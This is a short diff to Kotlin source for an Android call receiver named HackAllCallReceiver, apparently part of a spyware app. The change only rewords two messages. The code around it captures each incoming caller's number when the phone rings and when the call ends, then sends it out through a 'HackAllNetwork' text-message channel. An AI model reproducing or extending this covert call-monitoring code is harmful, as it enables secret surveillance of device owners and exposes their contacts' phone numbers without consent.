@@ -11,11 +11,11 @@ class HackAllCallReceiver: BroadcastReceiver() {
             val incomingCallNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)
             if (incomingCallNumber != null) {
                 if (intent.getStringExtra(TelephonyManager.EXTRA_STATE) == TelephonyManager.EXTRA_STATE_RINGING) {
-                    HackAllNetwork(context).sendTextMessage("INCOMING CALL RINGING: $incomingCallNumber")
+                    HackAllNetwork(context).sendTextMessage("\uD83D\uDCF1 New Call ringing: $incomingCallNumber")
                 }
                 if (intent.getStringExtra(TelephonyManager.EXTRA_STATE) == TelephonyManager.EXTRA_STATE_IDLE ||
                     intent.getStringExtra(TelephonyManager.EXTRA_STATE) == TelephonyManager.EXTRA_STATE_OFFHOOK) {
-                    HackAllNetwork(context).sendTextMessage("INCOMING CALL IDLE: $incomingCallNumber")
+                    HackAllNetwork(context).sendTextMessage("\uD83D\uDCF1 New Call ended: $incomingCallNumber")
                 }
             }
         }
